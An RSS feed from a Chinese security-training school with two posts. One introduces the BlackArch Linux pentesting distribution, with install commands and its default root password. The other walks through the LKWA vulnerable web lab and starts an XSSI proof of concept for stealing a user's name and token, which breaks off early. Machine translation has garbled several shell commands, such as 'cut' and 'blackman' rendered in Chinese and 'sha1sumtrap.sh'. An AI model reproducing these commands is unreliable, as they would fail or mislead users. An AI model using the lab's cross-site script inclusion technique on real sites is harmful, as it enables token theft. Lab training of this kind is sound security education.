<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>二向箔安全学院</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/</link>
<description>前沿、专业的网络空间攻防实训 专注于提供最前沿的网络空间安全攻防人才培养的解决方案。twosecurity.cn</description>
<language>zh-cn</language>
<lastBuildDate>Tue, 14 Jan 2020 19:19:45 +0800</lastBuildDate>
<item>
<title>集上千种工具于一体：BlackArch Linux（2020最新版）</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-14-102716285.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/102716285&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cedfb1007dcb813ed8c4bdc300b6fd00_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;BlackArch Linux 是一个基于 Arch Linux 的渗透测试发行版，面向渗透测试人员和安全研究人员。存储库包含2428个工具。可以单独或成组安装工具。BLACKARS Linux与现有的Arch安装兼容。&lt;/p&gt;&lt;p&gt;官网：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//blackarch.org/tools.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;blackarch.org/tools.htm&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-383bce9eee7869086d51a3b97b3bb2e3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1500&quot; data-rawheight=&quot;800&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1500&quot; data-original=&quot;https://pic4.zhimg.com/v2-383bce9eee7869086d51a3b97b3bb2e3_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-383bce9eee7869086d51a3b97b3bb2e3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1500&quot; data-rawheight=&quot;800&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1500&quot; data-original=&quot;https://pic4.zhimg.com/v2-383bce9eee7869086d51a3b97b3bb2e3_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-383bce9eee7869086d51a3b97b3bb2e3_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;BlackArch Linux 2020版&lt;/h2&gt;&lt;p&gt;像 kali 一样，让渗透测试人员专心干事情的工具集，累计 2400+ 工具，几乎满足日常任何渗透需求。（其目标就是取带 kali 成为新一代传奇，当然，目前显然超越了诸如Kali Linux之类的系统）&lt;/p&gt;&lt;p&gt;&lt;b&gt;下载&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//mirrors.tuna.tsinghua.edu.cn/blackarch/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;https：// mirrors .tuna.tsinghua.edu.cn / blackarch /&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;2. &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//mirrors.ustc.edu.cn/blackarch/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;mirrors.ustc.edu.cn/bla&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ckarch/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;更新内容&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;增加了 120 个新工具&lt;/li&gt;&lt;li&gt;向 lxdm 添加终端字体支持&lt;/li&gt;&lt;li&gt;修正了“无法通过菜单打开工具”的 bug&lt;/li&gt;&lt;li&gt;将 blackarch 安装程序更新为 v1.1.34&lt;/li&gt;&lt;li&gt;包括 linux 内核 5.4.6&lt;/li&gt;&lt;li&gt;更新的 urxvt 配置：添加对动态更改大小的支持&lt;/li&gt;&lt;li&gt;用 Vundle.vim 替换 vim。添加了新的 vim 插件：clang_complete&lt;/li&gt;&lt;li&gt;对所有包进行了质量保证和修复（运行时执行）&lt;/li&gt;&lt;li&gt;更新了所有 blackarch 工具和包，包括配置文件&lt;/li&gt;&lt;li&gt;更新了所有系统包&lt;/li&gt;&lt;li&gt;更新了所有窗口管理器菜单（awesome、fluxbox、openbox）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;安装（在ArchLinux之上安装）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;它充当非官方的用户存储库。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;＃以 root 身份运行 https://blackarch.org/strap.sh 并按照说明进行操作。
$ curl -O https://blackarch.org/strap.sh ＃SHA1的总和应该匹配：9f770789df3b7803105e5fbc19212889674cd503trap.sh
$ sha1sumtrap.sh ＃设置执行
$ chmod + xtrap.sh ＃运行trap.sh
$ sudo ./strap.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在可以从 blackarch 存储库安装工具。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;＃要列出所有可用工具，请运行
$ sudo pacman -Sgg | grep blackarch | 切-d&amp;#39;&amp;#39;-f2 | 排序-u＃要安装所有工具，请运行
$ sudo pacman -S blackarch＃要安装一类工具，请运行
$ sudo pacman -S blackarch- &amp;lt;类别&amp;gt;＃要查看blackarch类别，请运行
$ sudo pacman -Sg | grep blackarch
＃注意-安装blackarch工具时，可能有必要覆盖某些软件包。如果
＃遇到“failed to commit transaction”错误，请使用--needed和--overwrite开关
＃例如：
sudo pacman -Syyu --needed blackarch --overwrite=&amp;#39;*&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;作为替代安装方法的一部分，您可以从源代码构建blackarch软件包。可以在github上找到PKGBUILD 。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/BlackArch/blackarch&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/BlackArch/bl&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ackarch&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;＃首先，您必须安装 blackman。如果您的计算机上安装了 BlackArch 软件包存储库，则
＃您可以像这样安装 blackman：
$ sudo pacman -S布莱克曼＃下载，编译和安装软件包：
$ sudo blackman -i &amp;lt;程序包&amp;gt;＃下载，编译和安装整个类别
$ sudo blackman -g &amp;lt;组&amp;gt;＃下载，编译和安装所有BlackArch工具
$ sudo blackman -a＃列出blackarch类别
$ blackman -l＃列出类别工具
$ blackman -p &amp;lt;类别&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;ISO上安装&lt;/b&gt;&lt;/p&gt;&lt;p&gt;可以使用 Live 或 Netinstall 介质安装 BlackArch Linux（程序包和环境）。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;＃安装 blackarch-install-scripts 软件包
$ sudo pacman -S blackarch-install-scripts＃现在，您可以运行并按照说明进行操作
$ sudo blackarch 安装&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;详细安装：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//blackarch.org/blackarch-install.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;blackarch.org/blackarch&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;-install.html&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;VM安装教程&lt;/b&gt;：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//thewhiteh4t.github.io/2020/01/03/How-to-Install-BlackArch-Linux-in-VMWare-Workstation-15.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;thewhiteh4t.github.io/2&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;020/01/03/How-to-Install-BlackArch-Linux-in-VMWare-Workstation-15.html&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;完整工具列表&lt;/b&gt;：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//blackarch.org/tools.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;blackarch.org/tools.htm&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bd3fa8e0c2b21d82fb07ee8a352137bd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1168&quot; data-rawheight=&quot;1051&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1168&quot; data-original=&quot;https://pic2.zhimg.com/v2-bd3fa8e0c2b21d82fb07ee8a352137bd_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bd3fa8e0c2b21d82fb07ee8a352137bd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1168&quot; data-rawheight=&quot;1051&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1168&quot; data-original=&quot;https://pic2.zhimg.com/v2-bd3fa8e0c2b21d82fb07ee8a352137bd_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-bd3fa8e0c2b21d82fb07ee8a352137bd_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;安装后的默认帐号密码&lt;/b&gt;&lt;/p&gt;&lt;p&gt;帐号：root&lt;/p&gt;&lt;p&gt;密码：blackarch&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！CISP-PTE 认证技能包，让你免费体验 CISP-PTE 认证内容。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-14-102716285</guid>
<pubDate>Tue, 14 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>“鲜为人知”的web攻击靶场：LKWA</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-13-102536299.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/102536299&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a5228b41200835be44afc1c60763dead_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;就像标题所说，这是一个不同寻常的 web 攻击靶场，包含了 8 种鲜为人知的 web 攻击方式，常见的 XSS 漏洞在这里就没有了。&lt;/p&gt;&lt;p&gt;例如跨站点脚本包含（XSSI），PHP 对象注入（简单注入，cookie，对象引用），PHAR反序列化，SSRF 和变量 variable。&lt;/p&gt;&lt;h2&gt;LKWA&lt;/h2&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/weev3/LKWA&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/weev3/LKWA&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1861&quot; data-rawheight=&quot;957&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1861&quot; data-original=&quot;https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1861&quot; data-rawheight=&quot;957&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1861&quot; data-original=&quot;https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-69cf6eb6947214f8578b9aaec94ca2c3_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;docker 一键搭建&lt;/h2&gt;&lt;p&gt;&lt;b&gt;环境&lt;/b&gt;&lt;/p&gt;&lt;p&gt;win10&lt;/p&gt;&lt;p&gt;先下载项目到本地：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/weev3/LKWA&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/weev3/LKWA&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;使用它自带的 docker-compose 进行构建（跳转到项目目录下）&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;docker-compose build&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1041&quot; data-rawheight=&quot;238&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1041&quot; data-original=&quot;https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1041&quot; data-rawheight=&quot;238&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1041&quot; data-original=&quot;https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;然后开启容器&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;docker-compose up -d&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;访问 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//127.0.0.1%3A3000/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;http://127.0.0.1:3000&lt;/a&gt; 即可&lt;/p&gt;&lt;p&gt;&lt;b&gt;列表&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;盲 RCE&lt;/li&gt;&lt;li&gt;XSSI&lt;/li&gt;&lt;li&gt;PHAR 反序列化&lt;/li&gt;&lt;li&gt;PHP 对象注入&lt;/li&gt;&lt;li&gt;通过 Cookie 的 PHP 对象注入&lt;/li&gt;&lt;li&gt;PHP对象注入（对象参考）&lt;/li&gt;&lt;li&gt;通过 Cookie 的 PHP 对象注入&lt;/li&gt;&lt;li&gt;SSRF&lt;/li&gt;&lt;li&gt;变量变量&lt;/li&gt;&lt;/ul&gt;&lt;blockquote&gt;在测试 PHAR 反序列化之前，您需要在 php.ini 设置中将 phar.readonly = On 更改为 phar.readonly = Off &lt;/blockquote&gt;&lt;h2&gt;TEST-XSSI&lt;/h2&gt;&lt;p&gt;&lt;b&gt;什么是XSSI：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/8028511/what-is-cross-site-script-inclusion-xssi&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;stackoverflow.com/quest&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ions/8028511/what-is-cross-site-script-inclusion-xssi&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;浏览器已实现了 SOP 等安全功能，可防止从一个来源加载的文档或脚本如何与另一个来源的资源进行交互。它有助于隔离潜在的恶意文档，从而减少可能的攻击媒介。&lt;/p&gt;&lt;p&gt;例如，站点 A 实现的 example.js 和站点 B 希望从站点 A 读取 example.js。这将被 SOP 阻止。但是，如果站点 A 使用 JSONP，则站点 B 可以读取该 js 文件。&lt;/p&gt;&lt;p&gt;&lt;b&gt;题解&lt;/b&gt;&lt;/p&gt;&lt;p&gt;进入题目&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;976&quot; data-rawheight=&quot;456&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;976&quot; data-original=&quot;https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;976&quot; data-rawheight=&quot;456&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;976&quot; data-original=&quot;https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;提示提交用户名 admin，密码 password&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;963&quot; data-rawheight=&quot;442&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;963&quot; data-original=&quot;https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;963&quot; data-rawheight=&quot;442&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;963&quot; data-original=&quot;https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;目标是窃取用户和 Token&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;949&quot; data-rawheight=&quot;196&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;949&quot; data-original=&quot;https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;949&quot; data-rawheight=&quot;196&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;949&quot; data-original=&quot;https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;尝试登录后，进入一个个人信息页面&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;974&quot; data-rawheight=&quot;286&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;974&quot; data-original=&quot;https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;974&quot; data-rawheight=&quot;286&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;974&quot; data-original=&quot;https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;查看 js，观察到用户名和 token 是使用 ajax 检索的&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;973&quot; data-rawheight=&quot;378&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;973&quot; data-original=&quot;https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;973&quot; data-rawheight=&quot;378&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;973&quot; data-original=&quot;https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;创建一个 api 接口获取信息&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1114&quot; data-rawheight=&quot;480&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1114&quot; data-original=&quot;https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1114&quot; data-rawheight=&quot;480&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1114&quot; data-original=&quot;https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;窃取用户和 token 的POC&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;html&amp;gt;
  &amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;XSSI&amp;lt;/title&amp;gt;    
  &amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;script&amp;gt;
        function a(s)
        {
        alert(JSON.stringify(s));
        }
    &amp;lt;/script&amp;gt;
